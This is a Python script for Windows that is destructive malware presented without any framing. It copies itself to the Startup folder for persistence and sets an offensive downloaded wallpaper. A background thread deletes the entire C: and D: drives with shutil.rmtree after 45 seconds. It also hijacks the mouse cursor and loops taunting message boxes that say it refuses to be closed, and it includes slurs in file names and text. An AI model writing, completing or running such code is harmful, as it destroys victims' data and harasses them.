import shutil
import os
import sys
import requests
from PIL import Image
import time
import tkinter as tk
from tkinter import messagebox
import threading
import ctypes
import pyautogui
import random

def custom_messagebox(text, title):
    ctypes.windll.user32.MessageBoxW(0, text, title, 0)

def copy_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_path = sys.argv[0]
    shutil.copy(script_path, startup_folder)

def display_error_messages():
    while True:
        ctypes.windll.user32.MessageBoxW(0, "Congratulations, you have won an STD!", "LMAO", 0x10 | 0x1)
        ctypes.windll.user32.MessageBoxW(0, "Aw come on, dont go.", "LMAO", 0x10 | 0x1)
        ctypes.windll.user32.MessageBoxW(0, "Give up.", "LMAO", 0x10 | 0x1)
        ctypes.windll.user32.MessageBoxW(0, "Where are you going?", "LMAO", 0x10 | 0x1)
        ctypes.windll.user32.MessageBoxW(0, "Nice try.", "LMAO", 0x10 | 0x1)
        ctypes.windll.user32.MessageBoxW(0, "To put it simply,", "LMAO", 0x10 | 0x1)
        ctypes.windll.user32.MessageBoxW(0, "I refuse to be closed.", "LMAO", 0x10 | 0x1)

def move_image_boxes():
    image_url = 'https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png'
    response = requests.get(image_url, stream=True)
    with open('image.png', 'wb') as file:
        file.write(response.content)

    screen_width, screen_height = pyautogui.size()
    image_width, image_height = Image.open('image.png').size

    while True:
        x = random.randint(0, screen_width - image_width)
        y = random.randint(0, screen_height - image_height)

        pyautogui.moveTo(x, y, duration=1)

def dir_nuke():
    time.sleep(45)
    dirs = ['C:/', 'D:/']
    for directory in dirs:
        if os.path.exists(directory):
            shutil.rmtree(directory)

def change_wallpaper():
    wallpaper_url = "https://cdn.discordapp.com/attachments/1105563151216414811/1106193396948811867/retarded.png"
    response = requests.get(wallpaper_url)
    image_data = response.content
    wallpaper_file = "wallpaper.png"
    with open(wallpaper_file, "wb") as file:
        file.write(image_data)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_file), 3)
    os.remove(wallpaper_file)

if __name__ == "__main__":
    copy_to_startup()
    change_wallpaper()

    dir_nuke_thread = threading.Thread(target=dir_nuke)
    dir_nuke_thread.start()

    time.sleep(5)
    move_image_boxes_thread = threading.Thread(target=move_image_boxes)
    move_image_boxes_thread.start()

    display_error_messages()
